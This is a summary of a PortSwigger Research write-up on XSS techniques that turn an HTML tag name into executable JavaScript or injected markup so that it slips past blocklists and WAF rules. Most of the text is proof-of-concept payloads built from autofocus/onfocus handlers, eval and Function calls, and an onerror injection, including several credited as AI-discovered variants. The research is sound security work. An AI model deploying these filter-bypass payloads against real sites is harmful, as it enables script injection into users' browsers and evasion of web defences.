---
title: "What's in a tag name? JavaScript, apparently"
url: "https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently"
vuln_class: "Cross-site Scripting (XSS)"
tech: "Browser, HTML, JavaScript"
bounty: 0
source: "PortSwigger Research"
content_quality: "full"
date: 2026-08-25
---

Gareth Heyes: a tag name can become a JavaScript payload, a URL, or fresh markup -- useful for
blocklist/WAF bypass. Everything below works in every browser.

## Core primitives
- A tag name may be arbitrary text (must start `a-zA-Z`); the browser uppercases it, but
  `localName` returns the **lowercase** original.
- Any tag is focusable with `tabindex` (or `contenteditable`); chain `onfocus` with itself.
- Write a string into the event handler via `attributes[0].value`, converted to a Function and
  called with `new`:

```html
<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>
```

## Uppercase JS
```html
<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>
```

## Separator chars keep the tag name lowercased-but-valid
Line/paragraph separators are treated like newlines in JS:
```html
<null<U+2028>alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>
```

## If attributes[0].value is blocked
```html
<ALERT(1) onfocus="attributes[0].textContent=localName,new onfocus" autofocus tabindex=1>
<ALERT(1) onfocus="attributes[0].nodeValue=localName,new onfocus" autofocus tabindex=1>
```

## Combine tag name with first attribute (markup injection)
An opening angle bracket can be part of the tag name:
```html
<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>
```

## part / classList -> eval via Function constructor
`part` (and `classList`) split space-separated values into an array; extract the `onfocus(event)`
portion, overwrite the event var with the payload, replace onfocus with Function, eval:
```html
<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>
<ALERT(1) onfocus="event=localName;classList=onfocus,onfocus=Function,eval(classList[1])()" tabindex=1 autofocus>
```

## AI-discovered variants
```html
<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus contenteditable>
<ALERT(1) onfocus="getAttributeNode('onfocus').value=localName,onfocus()" autofocus tabindex=1>
<alert<img title=" src onerror=alert(1)> " onfocus=setHTMLUnsafe(localName+title) tabindex=1 autofocus>
```

## Lesson
Unusual HTML and seemingly harmless properties (`localName`, `part`, `classList`) become
unexpected sources of payload hiding/transformation that bypass blocklists and WAF signatures.
